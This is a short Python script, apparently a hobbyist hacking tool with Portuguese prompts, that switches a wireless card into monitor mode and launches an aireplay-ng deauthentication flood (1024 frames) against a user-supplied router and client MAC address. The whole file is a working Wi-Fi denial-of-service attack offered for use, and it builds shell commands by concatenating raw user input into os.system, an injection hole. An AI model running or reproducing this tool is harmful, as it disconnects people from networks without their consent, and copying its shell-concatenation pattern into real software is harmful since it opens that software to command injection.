#!/usr/bin/env python3
#Autor: Edward Ramos
#Tool Hacker
#08/04/2016 U.S.A
#Version 0.1.0 Date 09-03-2016
#Version(2) 42w_0.2.2 Date 11-09-2016  New Version
import sys
import os
def menu_opcoes(): #MENU OPCOES:
    menu_wireless = open('menu.txt')
    print(menu_wireless.read())  
    opcao = input('')
    if opcao == '1':
        os.system('ifconfig')
    elif opcao == '2':
        sys.exit(1)
menu_opcoes()
def download_interface():    #DOWN INTERFACES     
    opcao_interface = input('(+) Interface: Ex: wlan1:  ')
    if opcao_interface != '-1':
        os.system('ifconfig ' +opcao_interface+ ' down')
        os.system('iw dev ' +opcao_interface+ ' interface add mon0 type monitor')
        os.system('ifconfig mon0 up')
        os.system('ifconfig')
    else:
       sys.exit(1)
download_interface()
download_interface()
def tipo_attack(): #TYPE ATTACK
    opcao_attack = open('tipo_attacks.txt')
    print(opcao_attack.read())
    opcao_escolhida = input('>>> ')
    if opcao_escolhida == '-0':  #      --deauth      count : deauthenticate 1 or all stations (-0) 
        mac_alvo = str(input('Digite o MAC Router Destino: Exemplo: 54B80AF33FC3 >>>  '))
        mac_usuario = str(input('Digite o MAC Cliente Router Destino: Exemplo: B85A73AC60CC >>>  '))
        os.system('aireplay-ng -0 1024 -a ' +mac_alvo+ ' -c ' +mac_usuario+ ' mon0')
tipo_attack()
